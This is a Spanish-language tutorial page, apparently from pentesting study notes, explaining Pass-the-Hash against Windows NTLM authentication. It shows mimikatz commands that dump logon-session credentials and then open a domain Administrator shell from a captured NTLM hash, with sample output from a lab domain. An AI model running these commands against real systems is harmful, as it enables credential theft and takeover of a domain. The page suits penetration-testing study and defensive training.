---
icon: passport
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pass-The-Hash con Windows

Esta tecnica consiste en el protocolo de autenticacion `NTLM` con sus dichos `hashes` este protocolo de autenticacion es menos seguro que el de `kerberos`, pero cuando nosotros nos conectamos de forma remota o nos conectamos mediante una `IP` y no mediante un dominio en muchos casos pasara autenticarse mediante el protocolo `NTLM` pero si lo hacemos atraves de un dominio, podremos hacerlo mediante `kerberos`, por lo que con `NTLM` al ser menos seguro podremos realizar este tipo de tecnicas que vamos a ver ahora.

A dia de hoy se sigue utilizando a nivel local, pero podremos especificar a `Windows` que no queremos este tipo de autenticacion de una forma, pero no es muy recomendable, ya que muchas maneras de autenticacion pueden deshabilitarse y dar problemas.

Si nosotros hemos obtenido las credenciales del `Administrador` del dominio por ejemplo mediante las `logon sessions` utilizando `mimikatz` como hemos visto anteriormente:

```powershell
sekurlsa::logonpasswords
```

Info:

```
Authentication Id : 0 ; 7531224 (00000000:0072ead8)
Session           : Interactive from 0
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 20/01/2025 10:23:12
SID               : S-1-5-21-3352250647-938130414-2449934813-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : CORP
         * NTLM     : a87f3a337d73085c45f9416be5787d86
         * SHA1     : 34957e9ba3455a4a99d722b48693ac1123ba5dba
         * DPAPI    : b937fc9669fa922df0050d0d2f6d5de4
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : CORP.LOCAL
         * Password : (null)
        ssp :
        credman :
        cloudap :
```

Hemos intentado `crackear` el `hash` `NTLM` pero pongamos que no hemos obtenido exito.

Pero lo que si podemos hacer es realizar un `Pass-The-Hash` con `mimikatz` utilizando el `hash` del `Administrador` de la siguiente forma:

```powershell
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:a87f3a337d73085c45f9416be5787d86
```

Lo que va hacer `mimikatz` es crear una nueva `logon session` dentro de esta maquina (Ya que somos `administradores` locales de esta maquina) va a sobreescribir el `hash` que haya asociada a ella en memoria por este `hash` del usuario `administrador`, despues va a copiar el `Token de acceso` que tenemos asociado a este proceso y se lo va añadir tambien a esta `logon session`, y una vez echo eso va a ejecutar una `cmd` como dicho usuario.

Info:

```
user    : Administrator
domain  : corp.local
program : cmd.exe
impers. : no
NTLM    : a87f3a337d73085c45f9416be5787d86
  |  PID  3448
  |  TID  3228
  |  LSA Process is now R/W
  |  LUID 0 ; 7674536 (00000000:00751aa8)
  \_ msv1_0   - data copy @ 00000224E7C04E80 : OK !
  \_ kerberos - data copy @ 00000224E7D777C8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 00000224E7679D38 (32) -> null
```

Y veremos algo asi:

<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Y con esto ya tendremos un `cmd` como el usuario `Administrador` del dominio.
